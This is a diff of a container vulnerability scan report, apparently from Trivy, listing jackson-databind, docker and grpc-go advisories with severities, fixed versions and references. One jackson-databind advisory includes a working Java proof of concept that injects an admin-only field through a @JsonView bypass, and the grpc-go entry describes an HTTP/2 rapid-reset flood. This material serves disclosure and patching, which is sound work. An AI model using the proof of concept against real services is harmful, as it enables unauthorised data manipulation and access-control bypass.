+│                        │      │                   SetterlessProperty.isMerging() return true routed
+│                        │      │                   setterless Collection/Map properties through this unguarded
+│                        │      │                    path, so a setterless collection annotated with a
+│                        │      │                   restricted @JsonView is populated from attacker JSON even
+│                        │      │                   when the active view excludes it. This vulnerability is
+│                        │      │                   fixed in 2.21.4 and 3.1.4. 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-863 
+│                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+│                        │      │                  ╰ redhat: 2 
+│                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                        │      │                  │        │           L/A:N 
+│                        │      │                  │        ╰ V3Score : 5.3 
+│                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+│                        │      │                           │           N/A:N 
+│                        │      │                           ╰ V3Score : 5.3 
+│                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54517 
+│                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      5bf23edb4221f7dd2ec8e71ff6d26c61640f261d 
+│                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      94c5d215b3af1505098c686405d9641f041a9962 
+│                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5969 
+│                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5970 
+│                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/securit
+│                        │      │                  │      y/advisories/GHSA-5hh8-q8hv-fr38 
+│                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54517 
+│                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54517 
+│                        │      ├ PublishedDate   : 2026-06-23T21:17:02.853Z 
+│                        │      ╰ LastModifiedDate: 2026-06-27T20:51:09.987Z 
+│                        ├ [7]  ╭ VulnerabilityID : CVE-2026-54518 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-rcqc-6cw3-h962 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.21.4 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54518 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:b934ad5b74fa6ac91d8603333a607cb01a12c60d6111e53f4ece
+│                        │      │                   f770b9aa4b86 
+│                        │      ├ Title           : jackson-databind: jackson-databind: Information disclosure
+│                        │      │                   and data manipulation via view-based access control
+│                        │      │                   bypass 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4,
+│                        │      │                   UnwrappedPropertyHandler.processUnwrappedCreatorProperties(
+│                        │      │                   ) replays buffered JSON into creator parameters but never
+│                        │      │                   consults prop.visibleInView(activeView). The normal
+│                        │      │                   property-based creator path gates creator properties on the
+│                        │      │                    active view, but this unwrapped-creator replay path
+│                        │      │                   bypasses that check, so a constructor parameter annotated
+│                        │      │                   with both @JsonView(AdminView.class) and @JsonUnwrapped is
+│                        │      │                   populated from attacker JSON even when a more restrictive
+│                        │      │                   view is active. This vulnerability is fixed in 2.21.4 and
+│                        │      │                   3.1.4. 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-863 
+│                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+│                        │      │                  ╰ redhat: 2 
+│                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+│                        │      │                  │        │           L/A:N 
+│                        │      │                  │        ╰ V3Score : 6.5 
+│                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+│                        │      │                           │           L/A:N 
+│                        │      │                           ╰ V3Score : 6.5 
+│                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54518 
+│                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      721fa07ebbd4aab4a659a1a68940878315c3e341 
+│                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      d633bc038f200c1397c07f1a2b46f58e72c91eea 
+│                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5971 
+│                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5973 
+│                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/securit
+│                        │      │                  │      y/advisories/GHSA-rcqc-6cw3-h962 
+│                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54518 
+│                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54518 
+│                        │      ├ PublishedDate   : 2026-06-23T22:16:32.073Z 
+│                        │      ╰ LastModifiedDate: 2026-06-27T20:49:30.977Z 
+│                        ├ [8]  ╭ VulnerabilityID : CVE-2026-59888 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-3pjw-73gf-8qr5 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.18.8, 2.21.4 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59888 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:6cda858bf3f5cbadbd7c33a33bda7c77784e4b94a3934032bcdc
+│                        │      │                   748acb4bff9c 
+│                        │      ├ Title           : jackson-databind: @JsonIgnore on a Record property is
+│                        │      │                   bypassed with a PropertyNamingStrategy 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records
+│                        │      │                   using a PropertyNamingStrategy can bypass @JsonIgnore
+│                        │      │                   because POJOPropertiesCollector._removeUnwantedIgnorals()
+│                        │      │                   records an ignored component under its original implicit
+│                        │      │                   name before _renameUsing() applies the naming strategy,
+│                        │      │                   allowing the renamed JSON key to be assigned to the Record
+│                        │      │                   constructor parameter. This issue is fixed in versions
+│                        │      │                   2.18.8, 2.21.4, and 3.1.4. 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-915 
+│                        │      ├ VendorSeverity   ─ ghsa: 2 
+│                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/
+│                        │      │                         │           A:N 
+│                        │      │                         ╰ V3Score : 6.5 
+│                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      baa2cdf5ca2b2717fbb88d91955d69d8651df3e4 
+│                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      c7c678360624da5bc7eed2152789fa522880db9d 
+│                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/5974 
+│                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/securit
+│                        │      │                  │      y/advisories/GHSA-3pjw-73gf-8qr5 
+│                        │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59888 
+│                        │      ├ PublishedDate   : 2026-07-14T17:17:15.137Z 
+│                        │      ╰ LastModifiedDate: 2026-07-15T20:18:23.677Z 
+│                        ├ [9]  ╭ VulnerabilityID : CVE-2026-59889 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:53477688035e1f21a6d046ebbf5c7a594e02377ba1a52708ab25
+│                        │      │                   80e0986a60c0 
+│                        │      ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped
+│                        │      │                   container properties on deserialization 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1,
+│                        │      │                    UnwrappedPropertyHandler.processUnwrapped() replays
+│                        │      │                   buffered JSON for a @JsonUnwrapped property and calls
+│                        │      │                   prop.deserializeAndSet() without a
+│                        │      │                   prop.visibleInView(ctxt.getActiveView()) guard, allowing a
+│                        │      │                   property annotated with both @JsonView and @JsonUnwrapped
+│                        │      │                   to be written from attacker JSON under a less-privileged
+│                        │      │                   active view. This issue is fixed in versions 2.18.9,
+│                        │      │                   2.21.5, 2.22.1, 3.1.5, and 3.2.1. 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-863 
+│                        │      ├ VendorSeverity   ─ ghsa: 2 
+│                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/
+│                        │      │                         │           A:N 
+│                        │      │                         ╰ V3Score : 6.5 
+│                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      d627a8a86fcb062429282f79f3f256f181ed2c7b 
+│                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/
+│                        │      │                  │      6060 
+│                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
+│                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/securit
+│                        │      │                  │      y/advisories/GHSA-5gvw-p9qm-jgwh 
+│                        │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
+│                        │      ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
+│                        │      ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
+│                        ╰ [10] ╭ VulnerabilityID : GHSA-mhm7-754m-9p8w 
+│                               ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                               ├ PkgPath         : opt/oaf/openaf.jar 
+│                               ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                               │                  │       d@2.21.1 
+│                               │                  ╰ UID : 3293a4ace0bf5e 
+│                               ├ InstalledVersion: 2.21.1 
+│                               ├ FixedVersion    : 2.18.9, 2.21.5 
+│                               ├ Status          : fixed 
+│                               ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                               │                  │         197d9e39c5494d4581e40 
+│                               │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                               │                            df117adb7086d939b6bf5 
+│                               ├ SeveritySource  : ghsa 
+│                               ├ PrimaryURL      : https://github.com/advisories/GHSA-mhm7-754m-9p8w 
+│                               ├ DataSource       ╭ ID  : ghsa 
+│                               │                  ├ Name: GitHub Security Advisory Maven 
+│                               │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                               │                          ecosystem%3Amaven 
+│                               ├ Fingerprint     : sha256:b80abcb4c0c7c74a22c5044817f58da511ac4aec8356dc1f8d79
+│                               │                   a06e096d5ad3 
+│                               ├ Title           : jackson-databind: `@JsonView` bypass for creator properties
+│                               │                    with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)` 
+│                               ├ Description     : ## Summary
+│                               │                   
+│                               │                   In
+│                               │                   `BeanDeserializer.deserializeUsingPropertyBasedWithExternal
+│                               │                   TypeId`, the active-view (`@JsonView`) filter was applied
+│                               │                   only to the regular bean-property branch; the
+│                               │                   creator-property branch performed no
+│                               │                   `creatorProp.visibleInView(activeView)` check. A
+│                               │                   constructor parameter annotated with both
+│                               │                   `@JsonView(RestrictedView.class)` and
+│                               │                   `@JsonTypeInfo(use=Id.NAME,
+│                               │                     include=As.EXTERNAL_PROPERTY)` is populated from attacker
+│                               │                    JSON even when a more restrictive view is active.
+│                               │                     This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and
+│                               │                   GHSA-rcqc (CVE-2026-54518) descriptions cover only the main
+│                               │                    property-based path and the unwrapped-creator path
+│                               │                   respectively; the external-type-id creator path was fixed
+│                               │                   on the 3.x line via #6004 ("Extend #5969/#5971 fixes to ...
+│                               │                    external-type-id case in regular BeanDeserializer", commit
+│                               │                    7dc7a17, 2026-05-22) but
+│                               │                     **the fix was never backported to 2.21 or 2.18**. Users
+│                               │                   on 2.21.4 and 2.18.8 who upgraded per the published
+│                               │                   advisories remain vulnerable to the same `@JsonView` bypass
+│                               │                    technique via a different code path.
+│                               │                   ## Vulnerable Code Path
+│                               │                   File:
+│                               │                   `com/fasterxml/jackson/databind/deser/BeanDeserializer.java
+│                               │                   `
+│                               │                   Method: `deserializeUsingPropertyBasedWithExternalTypeId`
+│                               │                   On 2.21.4 (and 2.18.8), the creator-property branch (around
+│                               │                    line 1125-1158) checks `creatorProp.isInjectionOnly()` and
+│                               │                    hands off to `ext.handlePropertyValue(...)` /
+│                               │                   `buffer.assignParameter(...)` without ever consulting
+│                               │                   `visibleInView(activeView)`:
+│                               │                    ```java
+│                               │                     if (creatorProp != null) {
+│                               │                         // [databind#1381]: if useInput=FALSE, skip
+│                               │                   deserialization from input
+│                               │                         if (creatorProp.isInjectionOnly()) { ... }
+│                               │                         // NO visibleInView(activeView) CHECK HERE
+│                               │                         if (!ext.handlePropertyValue(p, ctxt, propName,
+│                               │                   null)) {
+│                               │                             if (buffer.assignParameter(creatorProp, ...)) {
+│                               │                   ... }
+│                               │                         }
+│                               │                         continue;
+│                               │                     }
+│                               │                   ```
+│                               │                   On 3.1.4, the same branch contains the additional guard
+│                               │                   (commit 7dc7a17):
+│                               │                      if (creatorProp != null) {
+│                               │                         // [databind#5971]: must honor active view here too
+│                               │                         if ((activeView != null) &&
+│                               │                   !creatorProp.visibleInView(activeView)) {
+│                               │                             p.skipChildren();
+│                               │                             continue;
+│                               │                         ...
+│                               │                   The 2.21 and 2.18 backport PRs (#6005 and #6003) only
+│                               │                   backported the main-path fixes from #5969/#5971; the
+│                               │                   external-type-id fix from #6004 was not backported. The
+│                               │                   maintainer closed #6005
+│                               │                     with "got changes merged forward, looks like it's all
+│                               │                   covered now", but the forward-merge did not include the
+│                               │                   ExtTypeId creator branch.
+│                               │                     Proof of Concept
+│                               │                     Compiles and runs against jackson-databind 2.21.4:
+│                               │                    
+│                               │                   ```java
+│                               │                     import com.fasterxml.jackson.annotation.*;
+│                               │                     import com.fasterxml.jackson.databind.ObjectMapper;
+│                               │                     public class JsonViewExternalTypeIdBypass {
+│                               │                         public static class PublicView {}
+│                               │                         public static class AdminView extends PublicView {}
+│                               │                         public static abstract class Asset { public String
+│                               │                   name; }
+│                               │                         public static class PublicAsset extends Asset {}
+│                               │                         public static class AdminAsset extends Asset { public
+│                               │                    String secret; }
+│                               │                         public static class Container {
+│                               │                             @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
+│                               │                                     include =
+│                               │                   JsonTypeInfo.As.EXTERNAL_PROPERTY,
+│                               │                                     property = "kind")
+│                               │                             @JsonSubTypes({
+│                               │                                 @JsonSubTypes.Type(value = PublicAsset.class,
+│                               │                    name = "pub"),
+│                               │                                 @JsonSubTypes.Type(value = AdminAsset.class, 
+│                               │                    name = "admin")
+│                               │                             })
+│                               │                             @JsonView(AdminView.class)
+│                               │                             public Asset asset;
+│                               │                             public String label;
+│                               │                             @JsonCreator
+│                               │                             public Container(
+│                               │                                     @JsonProperty("label") String label,
+│                               │                                     @JsonProperty("asset")
+│                               │                   @JsonView(AdminView.class) Asset asset) {
+│                               │                                 this.label = label;
+│                               │                                 this.asset = asset;
+│                               │                             }
+│                               │                         public static class Wrapper {
+│                               │                             @JsonView(PublicView.class)
+│                               │                             public Container data;
+│                               │                         public static void main(String[] args) throws
+│                               │                   Exception {
+│                               │                             // Admin-only "asset" should be blocked when
+│                               │                   reading with PublicView
+│                               │                             String json =
+│                               │                   "{\"data\":{\"label\":\"hello\",\"kind\":\"admin\","
+│                               │                                         +
+│                               │                   "\"asset\":{\"name\":\"foo\",\"secret\":\"LEAKED\"}}}";
+│                               │                             ObjectMapper om = new ObjectMapper();
+│                               │                             Wrapper r = om.readerWithView(PublicView.class)
+│                               │                                     .forType(Wrapper.class)
+│                               │                                     .readValue(json);
+│                               │                             System.out.println(r.data);
+│                               │                             // Actual on 2.21.4:   Container{label='hello',
+│                               │                   asset=AdminAsset{name='foo', secret='LEAKED'}}
+│                               │                             // Expected (secure):  Container{label='hello',
+│                               │                   asset=null}
+│                               │                             if (r.data.asset != null && r.data.asset
+│                               │                   instanceof AdminAsset) {
+│                               │                                 System.out.println("[!!] BYPASS CONFIRMED —
+│                               │                   admin-only asset populated under PublicView");
+│                               │                   A control case that removes include = As.EXTERNAL_PROPERTY
+│                               │                   (forcing the normal property-based path) correctly returns
+│                               │                   asset = null, confirming the bypass is specific to the
+│                               │                   ExternalTypeId
+│                               │                     code path and not a misconfiguration.
+│                               │                   ### Impact
+│                               │                     View-restricted (e.g. admin-only) creator properties can
+│                               │                   be populated from untrusted input where @JsonView is used
+│                               │                   as a write-side authorization boundary. Typical victims are
+│                               │                    Spring Boot
+│                               │                     REST controllers that use @JsonView(PublicView.class) on
+│                               │                   the request body to whitelist user-settable fields — an
+│                               │                   attacker can inject the restricted creator parameter
+│                               │                   (including choosing
+│                               │                     the polymorphic subtype via the sibling kind/type-id
+│                               │                   property) by combining it with a polymorphic
+│                               │                   @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same
+│                               │                   field.
+│                               │                   - CWE-863 (Incorrect Authorization)
+│                               │                   - Same impact class as CVE-2026-54517 / CVE-2026-54518
+│                               │                   - No RCE, no DoS — this is an access-control /
+│                               │                   mass-assignment bypass
+│                               │                   ### Trigger Conditions
+│                               │                   Developer code must combine (no opt-in user configuration
+│                               │                   required):
+│                               │                   1. Property-based @JsonCreator on the outer type
+│                               │                   2. A creator parameter annotated with
+│                               │                   @JsonView(RestrictedView.class)
+│                               │                   3. The same parameter annotated with
+│                               │                   @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY,
+│                               │                   property="...") 
+│                               ├ Severity        : MEDIUM 
+│                               ├ VendorSeverity   ─ ghsa: 2 
+│                               ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/
+│                               │                         │           A:N 
+│                               │                         ╰ V3Score : 6.5 
+│                               ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
+│                               │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/
+│                               │                  │      c628b357ed143d8492756d5c1458cfb9fbeb29ed 
+│                               │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/
+│                               │                  │      dea7eb466e98cc226c4ac65587581fb49926820c 
+│                               │                  ╰ [3]: https://github.com/FasterXML/jackson-databind/securit
+│                               │                         y/advisories/GHSA-mhm7-754m-9p8w 
+│                               ├ PublishedDate   : 2026-07-21T19:40:12Z 
+│                               ╰ LastModifiedDate: 2026-07-21T19:40:12Z 
 ├ [2]  ╭ Target  : usr/bin/docker 
 │      ├ Class   : lang-pkgs 
 │      ├ Type    : gobinary 
@@ -5393,7 +6173,7 @@
 │                        │     │                  │      26/cve-2026-41567.json 
 │                        │     │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-41567 
 │                        │     ├ PublishedDate   : 2026-06-05T02:17:13.817Z 
-│                        │     ╰ LastModifiedDate: 2026-07-17T13:18:39.403Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T12:18:28.263Z 
 │                        ├ [2] ╭ VulnerabilityID : CVE-2026-42306 
 │                        │     ├ VendorIDs        ─ [0]: GHSA-rg2x-37c3-w2rh 
 │                        │     ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
@@ -5511,7 +6291,7 @@
 │                        │     │                  │       026/cve-2026-33997.json 
 │                        │     │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
 │                        │     ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
-│                        │     ╰ LastModifiedDate: 2026-07-15T02:20:27.623Z 
+│                        │     ╰ LastModifiedDate: 2026-07-20T12:18:47.963Z 
 │                        ├ [4] ╭ VulnerabilityID : CVE-2026-41568 
 │                        │     ├ VendorIDs        ─ [0]: GHSA-vp62-88p7-qqf5 
 │                        │     ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
@@ -5615,10 +6395,136 @@
 │                        │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
 │                        │     │                   containing invalid UTF-8 bytes. 
 │                        │     ├ Severity        : UNKNOWN 
-│                        │     ╰ References       ╭ [0]: https://go.dev/cl/794100 
-│                        │                        ├ [1]: https://go.dev/issue/80142 
-│                        │                        ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
-│                        ├ [7] ╭ VulnerabilityID : CVE-2026-39822 
+│                        │     ├ References       ╭ [0]: https://go.dev/cl/794100 
+│                        │     │                  ├ [1]: https://go.dev/issue/80142 
+│                        │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                        │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T20:17:02.867Z 
+│                        ├ [7] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
+│                        │     ├ PkgID           : google.golang.org/grpc@v1.81.1 
+│                        │     ├ PkgName         : google.golang.org/grpc 
+│                        │     ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
+│                        │     │                  ╰ UID : e0d6d6ad1009c053 
+│                        │     ├ InstalledVersion: v1.81.1 
+│                        │     ├ FixedVersion    : 1.82.1 
+│                        │     ├ Status          : fixed 
+│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
+│                        │     │                  │         97d9e39c5494d4581e40 
+│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
+│                        │     │                            f117adb7086d939b6bf5 
+│                        │     ├ SeveritySource  : ghsa 
+│                        │     ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
+│                        │     ├ DataSource       ╭ ID  : ghsa 
+│                        │     │                  ├ Name: GitHub Security Advisory Go 
+│                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+│                        │     │                          cosystem%3Ago 
+│                        │     ├ Fingerprint     : sha256:0b9fc06c8f8f8d5f9abd7c89fd433b0cdf0de182fde0d9e49c760
+│                        │     │                   f2893d2bffc 
+│                        │     ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
+│                        │     ├ Description     : Multiple security vulnerabilities have been identified and
+│                        │     │                   addressed in grpc-go affecting the xDS RBAC authorization
+│                        │     │                   engine (internal/xds/rbac) and the HTTP/2 transport server
+│                        │     │                   implementation (internal/transport). These vulnerabilities
+│                        │     │                   could result in:
+│                        │     │                   
+│                        │     │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
+│                        │     │                    policies containing `Metadata` or `RequestedServerName`
+│                        │     │                   fields.
+│                        │     │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
+│                        │     │                   Rapid Reset mitigation bypass during client-initiated stream
+│                        │     │                    resets.
+│                        │     │                   - Denial of Service (Server Panic) when parsing crafted xDS
+│                        │     │                   RBAC policies containing `NOT` rules around unsupported
+│                        │     │                   ### Impact
+│                        │     │                   _What kind of vulnerability is it? Who is impacted?_
+│                        │     │                   #### xDS RBAC Authorization Bypass via `Metadata` &
+│                        │     │                   `RequestedServerName` matchers
+│                        │     │                   - Affected Component: xDS RBAC 
+│                        │     │                   - Impact: When building policy matchers for gRPC RBAC from
+│                        │     │                   xDS configurations, unsupported `permission` and `principal`
+│                        │     │                    rules (specifically `Metadata` and `RequestedServerName`)
+│                        │     │                   were silently ignored and treated as no-ops.
+│                        │     │                     - If an authorization policy relied purely on these
+│                        │     │                   matchers for access control, treating those rules as no-ops
+│                        │     │                   effectively removed the restrictions.
+│                        │     │                   - If these unsupported rules were nested inside logical
+│                        │     │                   `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or
+│                        │     │                   multi-condition `OR/AND` rules, silently dropping them
+│                        │     │                   changed the boolean logic flow of the authorization engine.
+│                        │     │                   As a result, policy evaluation decisions could fail open,
+│                        │     │                   allowing unauthorized clients to access protected gRPC
+│                        │     │                   services or resources.
+│                        │     │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of
+│                        │     │                   Service via Stream Aborts
+│                        │     │                   - Affected Component: HTTP/2 transport
+│                        │     │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
+│                        │     │                   Reset only applied threshold checks to items that directly
+│                        │     │                   resulted in control frames being written back to the wire,
+│                        │     │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
+│                        │     │                   When a client initiated a rapid flood of stream creation
+│                        │     │                   (`HEADERS`) immediately followed by stream termination
+│                        │     │                   `RST_STREAM`, items queued up in the control buffer without
+│                        │     │                   counting against the transport response frame threshold. An
+│                        │     │                   attacker can repeatedly trigger this flood sequence to
+│                        │     │                   bypass reader blocking, resulting in high CPU usage, and
+│                        │     │                   Denial of Service (DoS).
+│                        │     │                   #### Denial of Service (Panic) in xDS RBAC Engine via
+│                        │     │                   Unsupported Fields inside NOT Rules
+│                        │     │                   - Impact: The xDS RBAC policy translators recursively
+│                        │     │                   generate matchers for nested rules. When a `NOT` rule
+│                        │     │                   wrapped an unsupported or unhandled field (such as
+│                        │     │                   `SourcedMetadata`), the recursive step returned an empty
+│                        │     │                   matcher. This could result in a runtime panic when the RBAC
+│                        │     │                   engine attempts to authorize an incoming request.
+│                        │     │                   An attacker or misconfigured/malicious xDS management server
+│                        │     │                    delivering an LDS/RDS update containing a `NOT` rule around
+│                        │     │                    an unhandled field causes the gRPC server process to crash
+│                        │     │                   immediately (CWE-248 / Denial of Service).
+│                        │     │                   ### Patches
+│                        │     │                   _Has the problem been patched? What versions should users
+│                        │     │                   upgrade to?_
+│                        │     │                   All three issues have been fixed in `master` and will be
+│                        │     │                   released in 1.82.1 shortly.
+│                        │     │                   ### Workarounds
+│                        │     │                   _Is there a way for users to fix or remediate the
+│                        │     │                   vulnerability without upgrading?_
